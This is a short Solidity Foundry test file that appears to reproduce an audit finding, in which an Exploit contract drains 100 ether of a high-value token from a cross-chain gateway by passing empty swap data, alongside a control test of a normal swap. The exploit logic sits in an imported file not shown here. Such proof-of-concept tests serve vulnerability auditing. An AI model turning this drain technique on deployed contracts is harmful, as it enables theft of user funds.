// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58580-h-3-attacker-can-steal-an-high-value-token-due-to-lack-of-sw.sol";

contract DodoEmptySwapDataTest is Test {
    function test_exploit_emptySwapDrainsHighValue() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 100 ether);
        assertEq(e.eth().balanceOf(address(e.attackerRecv())), 100 ether);
        assertEq(e.eth().balanceOf(address(e.gateway())), 1900 ether);
        assertEq(e.avax().balanceOf(address(e.gateway())), 100 ether);
    }

    function test_control_nonEmptySwapUsesRouter() public {
        Exploit e = new Exploit();
        // Fund router with ETH inventory; non-empty swapData performs real swap.
        e.eth().mint(address(e.swapRouter()), 50 ether);
        e.avax().mint(address(this), 10 ether);
        e.avax().approve(address(e.gateway()), 10 ether);
        uint256 before = e.eth().balanceOf(address(this));
        e.gateway().withdrawToNativeChain(
            address(e.avax()), 10 ether, address(e.eth()), hex"01", address(this)
        );
        assertEq(e.eth().balanceOf(address(this)) - before, 10 ether);
    }
}
